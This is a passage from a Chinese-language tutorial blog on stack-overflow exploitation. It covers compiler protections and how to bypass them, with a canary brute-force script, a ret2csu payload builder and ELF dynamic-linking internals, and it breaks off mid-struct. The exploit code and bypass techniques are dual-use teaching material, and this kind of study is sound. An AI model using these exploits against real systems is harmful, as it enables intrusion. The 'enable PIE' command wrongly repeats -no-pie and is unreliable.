以前的矿工下矿之前为了检查矿井内是否有有毒气体，通常会将一只金丝雀送进去，如果金丝雀死了，就代表矿洞内有有毒气体（也有版本说是盗墓者盗墓会用金丝雀判断墓穴内是否有有毒气体）。Canary 是一种防止栈溢出的保护机制，其原理为在程序的入口处首先从 fs/gs 寄存器偏移 0x28 处取出 4 或 8 个字节（取决于操作系统位数）压入栈中，之后在开辟其他局部变量栈帧，当函数执行结束以后再检查该值是否与之前相同，若相同则正常退出函数，否则检测到发生栈溢出，调用 <code>__stack_chk_fail</code> 函数强制终止程序运行。为了避免 canary 被其上方的局部变量一起打印输出，canary 通常以 0x00 结尾以截断 canary 上面局部变量的字符串。编译器通常默认不开启 canary 保护。Canary 在栈中结构如下所示。</p><p>  <img src="/2021/08/14/StackOverflow-CheatSheet/8.png"></p><p>  <code>__stack_chk_fail</code> 函数原型如下 </p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** % s ***: % s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv [<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭 canary</span></span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启 canary，但是只会为局部变量中含有 char 数组的函数开启 </span></span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 为所有函数开启 canary</span></span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></li><li><p>NX（No Execute，堆栈不可执行）</p><p>  将堆栈内存页标记为不可执行，当控制流程转入堆栈上以后，CPU 若尝试在堆栈上执行指令时就会引发异常。编译器通常默认开启 NX。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭 NX</span></span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启 NX</span></span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></li><li><p>PIE（Position Independent Executable，地址无关代码）</p><p>  基于 ASLR 的代码段与数据段地址随机化技术，需要编译器将程序编译成位置无关，并链接为 ELF 共享对象，程序每次加载到内存中以后代码地址与数据地址均不同，主要影响代码段 (.text)，数据段 (.data) 与全局数据段 (.bss)。注意只有开启了 ASLR，PIE 才会生效，编译器通常默认开启 PIE。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭 PIE</span></span><br><span class="line">gcc -no-pie -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启 PIE</span></span><br><span class="line">gcc -no-pie -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></li><li><p>RELRO（Read Only Relocation，重定向只读）</p><p>  将经过动态链接器处理过后的内存区域设置为只读权限以避免 got 表劫持这类攻击方式。RELRO 通常有两种：</p><ul><li><p>Partial RELRO</p><p> 影响部分通过动态链接器处理的内存段 (.init_array .fini_array .jcr .dynamic .got) 并且设置为只读，但是 got 表 (.got.plt) 还是可写的 </p></li><li><p>Full RELRO</p><p>Partial RELRO 的基础上经用了延迟绑定，got 表中所有条目在程序刚加载 libc 的时候全部解析完成，并且将 got 表设置为只读。</p><p> 编译器通常默认开启 Partial RELRO。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭 RELRO</span></span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启 Partial RELRO</span></span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启 Full RELRO</span></span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="Common-Bypass"><a href="#Common-Bypass" class="headerlink" title="Common Bypass"></a>Common Bypass</h2><ol><li><p>ret2text</p><p> 修改返回地址到程序中已经存在的代码处，例如有些程序中可能提供了执行系统命令的方法。</p></li><li><p>ret2syscall</p><p> 如 0x5 节中所提到的，通过 ROP 构造系统调用 execve 执行命令。</p></li><li><p>ret2shellcode</p><p> 如 0x6 节中所提到的，通过将 shellcode 写入某处具有可执行权限的内存并且执行 shellcode，shellcode 通常也是一段进行系统调用的二进制代码。</p></li><li><p>ret2libc</p><p> 如 libc 节中所提到的，通过程序中泄漏的 libc 地址来获取 system 函数在 libc 中的真实地址，从而跳转到 libc 中的 system 函数执行命令。</p></li></ol><h2 id="Bypass-ASLR"><a href="#Bypass-ASLR" class="headerlink" title="Bypass ASLR"></a>Bypass ASLR</h2><p>ASLR 是最常见的保护措施，有很多种基础的方法可以绕过，大部分方法在前文中均介绍过。</p><ol><li><p>nop 垫 </p><p> 若没有开启 NX（比较少见），则可以将 shellcode 写入栈上，但是由于无法确定 shellcode 准确的地址，因此可以在 shellcode 前面填充大量的 nop 指令（0x90，也称为 nop 垫，该指令什么也不做），跳转的时候可以跳转到一个大致的范围，只要命中了一个 nop 垫，就可以一直滑行到 shellcode，nop 垫填充的越多，命中的概率越大。</p></li><li><p> 泄漏 libc 基地址 </p><p> 最常用的办法，如 libc 节中所讲， 先泄漏出 libc 中某个函数的地址以后再计算出其他函数的地址，此类攻击方法要求程序必须一次执行可以多次输入输出。</p></li><li><p> 爆破 libc 基地址 </p><p> 由于 libc 基地址的随机化只会影响一个字节也就是 8 位，所以最多只需要爆破 256 次就可以爆破出正确的 libc 基地址。libc 基地址的最后 12 位（3 个十六进制数）都是 0，从倒数第 20 位到倒数第 12 位这 8 位每次都会改变，其余位不变，例如 0xf7fxx000，其中 xx 为每次改变的字节。该攻击方法需要提前知道 libc 版本。</p></li><li><p> 修改 got 表 </p><p> 比较常用的办法。如 libc 节中修改 got 表的方法，可以将 got 表项修改为某个 libc 函数地址，如果没有开启 PIE，也可以修改为 ROP 链的起始地址。</p></li><li><p>ROP 链 </p><p> 也是非常常用的办法，如果没有开启 PIE 则可以直接构造 ROP 链。</p></li></ol><h2 id="Bypass-Canary"><a href="#Bypass-Canary" class="headerlink" title="Bypass Canary"></a>Bypass Canary</h2><p> 比较令人烦恼的保护措施，canary 主要为了防止栈溢出，并且 canary 最后一个字节为 0x00。</p><ol><li><p> 泄漏 canary</p><p> 最常用的方法。为了避免 canary 被其他局部变量附带输出，所以 canary 通常以 0x00 结尾以截断 canary 上面的局部变量，因此可以通过栈溢出覆盖掉 canary 最后的 0x00，使其可以被附带输出，即可泄漏 canary，拿到 canary 以后溢出的时候将 canary 填写到对应的位置即可绕过。</p></li><li><p> 爆破 canary</p><p> 程序每次启动后 canary 是不同的，但是对于同一个进程，由于子进程会拷贝父进程的内存，子线程与父线程共用内存，所以一个程序的子进程和子线程的 canary 都是相同的，因此如果程序可以多次 fork 子进程或者启动子线程，那么就可以在子进程或子线程中爆破 canary。</p><p> 对于爆破过程，采用逐字节爆破是最高效的，每次爆破最低的一个字节（8 位，16*16=256 次），从 0x00 到 0xff，并且 canary 的结尾必是 <code>\x00</code>，因此 32 位只需要爆破 3 个字节（256*3=768 次），64 位只需要爆破 7 个字节（256*7=1792 次）。</p><p> 爆破 canary 的脚本如下 </p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">start = <span class="built_in">len</span>(p)</span><br><span class="line">stop = <span class="built_in">len</span>(p) + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(p) &lt; stop:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">      ret = send_and_recv (p + <span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ret:</span><br><span class="line">         canary += <span class="built_in">chr</span>(i)</span><br><span class="line">         <span class="built_in">print</span> <span class="string">&quot;[+] Find 0x%02x&quot;</span> % i</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="built_in">print</span> <span class="string">&quot;[-] Brute failed&quot;</span></span><br><span class="line">         sys.exit (-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = canary [stop:start-<span class="number">1</span>:-<span class="number">1</span>].encode (<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Got canary: 0x% s&quot;</span> % canary</span><br></pre></td></tr></table></figure></li><li><p> 劫持 <code>__stack_chk_fail</code></p><p> 该函数在 canary 对比失败以后会被调用，该函数会强制终止程序。该函数属于 libc，因此函数地址在 got 表中，通过劫持 got 表可以修改该函数从而使程序不会被终止。此外由于该函数在终止前还会打印出 argv [0] 的内容（也就是程序名），因此如果可以获取到 argv 在 libc 中的地址，并且修改 argv，就可以通过该函数打印出需要的数据。</p></li><li><p> 修改 canary</p><p> 在前文中提到过，函数中的 canary 是从 fs/gs 寄存器偏移 0x28 处取出 4 或 8 个字节，实际上 fs/gs 寄存器偏移 0x28 处是 TLS (thread local storage，线程局部存储) 中的 stack_guard 值，因此如果可以修改 TLS 中的 stack_guard 就可以修改 canary。</p></li></ol><h2 id="Bypass-NX"><a href="#Bypass-NX" class="headerlink" title="Bypass NX"></a>Bypass NX</h2><p>NX 为了防止堆栈上的 shellcode，也很常见。开启 NX 以后就不能直接把 shellcode 写入堆栈上，但是可以想办法找到其他具有可执行权限的段去写，不过 Bypass NX 最常用的方法就是 ROP，使用 ROP 只需要把 ROP 链的各个地址与参数压入栈中，最终跳转到 shellcode 地址或者构造系统调用，ROP 的执行过程还是在代码段中。或者可以如 libc 中所介绍的攻击方法，总之开启了 NX 就代表堆栈上无法执行任何代码。</p><h2 id="Bypass-PIE"><a href="#Bypass-PIE" class="headerlink" title="Bypass PIE"></a>Bypass PIE</h2><p> 最麻烦的保护措施，通过将代码段，数据段，全局变量段等进行地址随机化，使得常用的 ROP 技术失效（制作 ROP 链需要知道 gadgets 的地址）。程序中每一条指令的地址都作为一个偏移，在程序执行的过程中指令的真实地址就是程序运行时的基地址加上该指令偏移地址就可以得到真实地址。由于每次程序执行代码地址都会变，因此不方便下断点调试，可以在 gdb 中先用 vmmap 查看程序基地址，再加上偏移地址就可以得到真实地址。</p><ol><li><p>partial write</p><p> 最常用的绕过方式，开启了 PIE 后虽然基地址每次都会改变，但是低 12 位 (3 个十六进制数) 是不变的，因此通过改写后 12 位地址就控制一部分范围的偏移跳转，若目标地址刚好位于修改第 12 位就可以跳转的范围内，就可以通过 partial write 绕过 PIE</p></li><li><p> 泄漏地址 </p><p> 开启 PIE 的程序每条指令都采用相对偏移地址，很类似 libc 节中 libc 函数的情况 ，每条指令的偏移是可以事先得知的，因此只要能够在程序运行的过程中泄漏出任何一个指令的真实地址，那么就可以计算出程序的基地址，这样其他指令的地址就可以得知了，类似 libc 节中泄漏 libc 基地址计算 system 的地址。</p></li><li><p>vsyscall</p><p> 为了加快程序执行系统调用的速度，部分 linux 内核将部分无参数的系统调用从内核空间映射到用户空间里，这些被映射的系统调用被称为 vsyscall。程序就算开启了 PIE，但是 vsyscall 的地址是不变的，所以 vsyscall 中调用 syscall 指令的地址也是一直不变的，这样我们就有了一个 <code>syscall</code> 的 gadget。需要注意的是直接 rop 跳到 vsyscall 里的 <code>syscall</code> 会段错误，因为 vsyscall 会检查是否是从该系统调用的开头开始执行的（例如 syscall 的地址是 0xffffffffff600007，而该系统调用函数的开头是 0xffffffffff600000，所以我们只能先跳转到 0xffffffffff600000）。此外，现在的部分操作系统已经删除了 vsyscall 功能。</p></li><li><p>vdso</p><p> vdso 是为了取代 vsyscall 而存在的，功能和 vsyscall 一样，由 glibc 提供，因此 vdso 中的地址是随机化的，不过好处是 vdso 中的任意一条指令都可以执行，不像 vsyscall 还会检查是否是从开头执行。那么如果要利用 vdso，就需要爆破出 vdso 中的指令地址，在 64 位下 vdso 的地址随机化达到 22 位，而 32 位仅有 16 位（一个字节）是随机的，比较容易爆破，</p></li></ol><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p> 此攻击方式是 <a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf">BlackHat2018</a> 中提出来的，可以看做是 rop 的万金油，其作用就是在利用 __libc_csu_init 函数中提供的通用 gadgets 来实现调用任意参数小于等于 3 个的函数。__libc_csu_init 位于程序中，其作用就是初始化 libc，所以此攻击的前提就是程序需要调用 libc。在 __libc_csu_init 中一共有两段可用的 gadgets，如下所示（这里提供的 64 位示例来自 CTF Wiki，不同的 libc 版本该函数的内容可能不太一样，但是总体上是差不多的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">; Second gadgets.</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">; First gadgets.</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure><p> 第一段 gadgets 从 0x40061A 开始（即 pop rbx）可以利用栈上的值控制寄存器 rbx，rbp，r12，r13，r14，r15，第二段 gadgets 从 0x400600 开始（即 mov rdx, r13），可以通过 r13，r14 与 r15 控制函数的前三个参数 rdx，rsi 与 rdi（只能控制低 32 位 4 个字节，高 32 位为 0），而之后紧接着就有一个 call，通过 r12 与 rbx 就可以构造出目标函数的地址。call 指令结束以后后面三条指令的目的就是需要满足 rbp==rbx+1，如果满足该关系式程序逻辑就不会进行跳转，而是继续执行后面的指令。</p><p> 攻击前提：</p><ol><li>64 位程序 </li><li> 使用了 libc</li><li> 没有开启 PIE</li></ol><p> 由于可控制的函数的第一个参数只能控制 4 个字节，因此 system 函数这一类的就用不了，但是可以利用 read 或者 write 函数读写地址。利用的 exp 如下（不同版本可能寄存器不太一样）。其中 gadgets1 和 gadgets2 对应的就是上面的 First gadgets 和 Second gadgets。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu64</span>(<span class="params">gadgets1, gadgets2, func_addr, arg0, arg1, arg2</span>):</span><br><span class="line">    rbx, rbp = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    r12 = func_addr</span><br><span class="line">    r13 = arg2  <span class="comment"># rdx</span></span><br><span class="line">    r14 = arg1  <span class="comment"># rsi</span></span><br><span class="line">    r15 = arg0  <span class="comment"># rdi, only low 32bits available.</span></span><br><span class="line">    <span class="keyword">return</span> p64 (gadgets1) + \</span><br><span class="line">        p64 (rbx) + p64 (rbp) + \</span><br><span class="line">        p64 (r12) + p64 (r13) + \</span><br><span class="line">        p64 (r14) + p64 (r15) + \</span><br><span class="line">        p64 (gadgets2)</span><br><span class="line"></span><br><span class="line">conn.send (junkdata + ret2csu (...))</span><br></pre></td></tr></table></figure><p>32 位的 gadget 如下所示，由于 32 位主要通过栈传递参数，因此利用范围比 64 位小很多。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:080487D8 loc_80487D8:                            ; CODE XREF: __libc_csu_init+57↓j</span><br><span class="line">; Second gadgets.</span><br><span class="line">.text:080487D8                 mov     eax, [esp+2Ch+arg_8]</span><br><span class="line">.text:080487DC                 mov     [esp+2Ch+var_2C], ebp</span><br><span class="line">.text:080487DF                 mov     [esp+2Ch+var_24], eax</span><br><span class="line">.text:080487E3                 mov     eax, [esp+2Ch+arg_4]</span><br><span class="line">.text:080487E7                 mov     [esp+2Ch+var_28], eax</span><br><span class="line">.text:080487EB                 call    ds:(__frame_dummy_init_array_entry - 804A000h)[ebx+edi*4]</span><br><span class="line">.text:080487F2                 add     edi, 1</span><br><span class="line">.text:080487F5                 cmp     edi, esi</span><br><span class="line">.text:080487F7                 jnz     short loc_80487D8</span><br><span class="line">.text:080487F9</span><br><span class="line">.text:080487F9 loc_80487F9:                            ; CODE XREF: __libc_csu_init+30↑j</span><br><span class="line">.text:080487F9                 add     esp, 1Ch</span><br><span class="line">; First gadgets.</span><br><span class="line">.text:080487FC                 pop     ebx</span><br><span class="line">.text:080487FD                 pop     esi</span><br><span class="line">.text:080487FE                 pop     edi</span><br><span class="line">.text:080487FF                 pop     ebp</span><br><span class="line">.text:08048800                 retn</span><br></pre></td></tr></table></figure><h2 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h2><p> 在 libc 节中 libc 中提到过 plt 表的第一项就是跳转到 _dl_runtime_resolve 函数，该函数的作用就是动态将 libc 中的函数地址写入 got 表中，并且执行被解析到函数。_dl_runtime_resolve 函数原型为 <code>_dl_runtime_resolve (link_map_obj, reloc_index)</code>，假如可以控制这两个参数，就可以控制 _dl_runtime_resolve 解析并执行我们想要的函数。</p><p>plt 表与 got 表的部分结构如下所示。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">plt [0]:</span><br><span class="line">    push got [1]</span><br><span class="line">    jmp got [2]</span><br><span class="line">func@plt:</span><br><span class="line">    jmp func@got</span><br><span class="line">    push func_index</span><br><span class="line">    jmp plt [0]</span><br><span class="line"></span><br><span class="line">got [0] ---&gt; .dynamic address</span><br><span class="line">got [1] ---&gt; link_map_object address</span><br><span class="line">got [2] ---&gt; _dl_runtime_resolve address</span><br></pre></td></tr></table></figure><p> 通过上表可以看到 _dl_runtime_resolve 函数的两个参数 link_map_obj 与对应的函数 reloc_index 分别在 func@plt 与 plt [0] 中被 push 到栈中，而 jmp 到 got [2] 以后直接调用 _dl_runtime_resolve 函数，执行顺序的行数为 5，6，7，2，3，11。</p><p> 在 _dl_runtime_resolve 调用的时候，会做如下几件事，而这几件事对后续的 ret2dlresolve 利用非常重要。</p><ol><li> 首先通过 link_map_object 访问.dynamic 段（link_map_object 保存了.dynamic 地址），分别取出.dynstr，.dynsym 和.rel.plt 的地址，其中.dynstr 为动态链接字符串表，包含了动态链接时所需要的所有字符串（包括函数名），.dynsym 是动态链接符号表，类似符号表，里面保存了和动态链接相关的所有符号，.rel.plt 是动态链接代码重定位段，包含了需要重定位的函数信息，包括函数偏移，在符号表中的索引等。</li><li> 在取出这三个地址以后，先通过.rel.plt 地址 + reloc_index 就可以计算出要被动态链接的函数的重定位表指针 rel</li><li> 然后通过 <code>rel-&gt;r_info&gt;&gt;8</code> 就可以计算出在.dynsym 动态链接符号表中的下标 </li><li> 根据.dynsym 的地址 + 下标偏移就可以拿到对应符号表项的指针 sym</li><li> 之后通过.dynstr 地址 +<code>sym-&gt;st_name</code> 就可以取出符号名字符串的指针，也就是函数名指针 </li><li> 然后在动态链接库中查找这个函数的地址，并把地址写入 <code>*(rel-&gt;r_offset)</code>，也就是该函数对应的 got 表项 </li><li> 最后调用这个函数 </li></ol><p> 其中.dynamic 段的结构是一个数组，数组每一项的结构如下所示，其实根据 d_tag 的值就可以很容易在.dynamic 中找到对应项地址，.dynstr，.dynsym 和.rel.plt 对应的 tag 值为 5，6，17。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL   0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED 1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ 2   <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT 3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH   4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB 5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB 6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA   7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ 8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELAENT  9   <span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ  10    <span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT 11    <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT   12    <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI   13    <span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SONAME 14    <span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RPATH  15    <span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMBOLIC 16    <span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_REL    17    <span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELSZ  18    <span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELENT 19    <span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTREL 20    <span class="comment">/* Type of reloc in PLT */</span></span></span><br></pre></td></tr></table></figure><p>.dynsym 是一个数组，数组的每一项 sym 的结构如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;   <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;  <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;   <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info;   <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;  <span class="comment">/* Symbol visibility under glibc&gt;=2.2 */</span></span><br><span class="line">  Elf32_Section st_shndx;  <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; 